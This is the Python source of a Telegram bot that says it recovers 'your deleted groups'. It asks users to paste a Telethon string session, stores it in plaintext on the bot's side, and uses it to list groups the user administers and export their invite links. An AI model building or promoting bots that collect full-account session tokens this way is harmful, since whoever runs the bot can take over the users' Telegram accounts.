from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ExportChatInviteRequest
from kvsqlite.sync import Client
from base64 import b64decode
import asyncio
import telebot
from telebot import types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, UserDeactivatedBanError
from datetime import datetime
from config import API_ID, API_HASH, BOT_TOKEN  # Import from config

data = Client("session_data.bot")
bot = telebot.TeleBot(BOT_TOKEN)

sessions = {}
check_with_sessions = {}

def create_buttons():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    start_check = types.KeyboardButton("Start Check")
    add_session = types.KeyboardButton("Add Session")
    show_sessions = types.KeyboardButton("Show Sessions")
    show_time = types.KeyboardButton("Current Time")
    programmer = types.KeyboardButton("Programmer")
    programmer_channel = types.KeyboardButton("Programmer's Channel")
    bot_info = types.KeyboardButton("Bot Info")
    markup.add(start_check)
    markup.add(add_session, show_sessions, show_time)
    markup.add(bot_info)
    markup.add(programmer, programmer_channel)
    return markup

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_video(
        message.chat.id,
        "https://t.me/yyyyyy3w/31",
        caption="""
Welcome to the bot for retrieving *your deleted groups*. Send commands now.
Bot programmer: [Shion](t.me/DeityEmperor)
        """,
        parse_mode="Markdown",
        reply_markup=create_buttons()
    )

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    text = message.text
    user_id = message.from_user.id

    if text == "Start Check":
        asyncio.run(check_groups(message))
    elif text == "Programmer":
        bot.reply_to(message, "- Bot Programmer: [Shion](t.me/DeityEmperor)", parse_mode="Markdown", disable_web_page_preview=True)
    elif text == "Programmer's Channel":
        bot.reply_to(message, "- Programmer's Channel: [Python Tools](t.me/Coding)", parse_mode="Markdown", disable_web_page_preview=True)
    elif text == "Bot Info":
        bot.reply_to(message, "The bot is simple, no extra info needed. Enjoy!")
    elif text == "Add Session":
        bot.reply_to(message, "Send the *Telethon* session now", parse_mode="Markdown")
        sessions[user_id] = "add"
    elif text == "Show Sessions":
        saved_session = data.get(f"session_{user_id}")
        if saved_session:
            bot.reply_to(message, saved_session)
        else:
            bot.reply_to(message, "No session added!")
    elif user_id in sessions and sessions[user_id] == "add":
        session_data = message.text
        try:
            asyncio.run(check_session(message, user_id, session_data))
        except Exception:
            bot.reply_to(message, "Session expired ❌")
        del sessions[user_id]
    elif text == "Current Time":
        current_time = datetime.now().strftime("%I:%M:%S")
        bot.reply_to(message, f"*- Current time is:* `{current_time}`", parse_mode="Markdown")

async def check_session(message, user_id, session_data):
    try:
        client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            raise Exception("Session expired ❌")
        data.set(f"session_{user_id}", session_data)
        await client.send_message("me", "*Welcome! You are logged in. Please wait for the check to complete.*\nBot programmer: @M02MM")
        bot.reply_to(message, "Session saved ✅")
        check_with_sessions[user_id] = session_data
        await client.disconnect()

    except (SessionPasswordNeededError, PhoneCodeInvalidError, UserDeactivatedBanError):
        bot.reply_to(message, "Session expired ❌")
    except Exception:
        bot.reply_to(message, "Session expired ❌")

async def check_groups(message):
    user_id = message.from_user.id
    try:
        session_data = check_with_sessions[user_id]
    except KeyError:
        bot.reply_to(message, "No session added!")
        return
    
    if session_data:
        bot.reply_to(message, "Checking...")
        try:
            client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                raise Exception("Session expired ❌")
        except (SessionPasswordNeededError, PhoneCodeInvalidError, UserDeactivatedBanError):
            bot.reply_to(message, "Session expired ❌")
            return
        except Exception:
            bot.reply_to(message, "Session expired ❌")
            return
    else:
        bot.reply_to(message, "No session added!")
        return 

    async with client:  # Ensures client disconnects automatically
        async for dialog in client.iter_dialogs(ignore_migrated=True):
            try:
                if dialog.is_group:
                    full_chat = await client.get_entity(dialog)
                    if hasattr(full_chat, 'admin_rights') and full_chat.admin_rights:
                        if full_chat.admin_rights.add_admins:
                            group_creation_date = full_chat.date
                            formatted_date = group_creation_date.strftime('%Y/%m/%d')
                            group_id = full_chat.id
                            group_name = full_chat.title
                            group_username = full_chat.username if full_chat.username else "None"
                            invite_link = await client(ExportChatInviteRequest(group_id))
                            members_count = (await client.get_participants(full_chat)).total
                            bot.reply_to(message, f"""
- Group Name: {group_name}
- Group Username: @{group_username}
- Group ID: {group_id}
- Member Count: {members_count}
- Creation Date: {formatted_date}
- Group Link: {invite_link.link}
- Bot Programmer: @deityEmperor
                            """, disable_web_page_preview=True)
            except Exception as e:
                print(f"Error processing dialog: {e}")
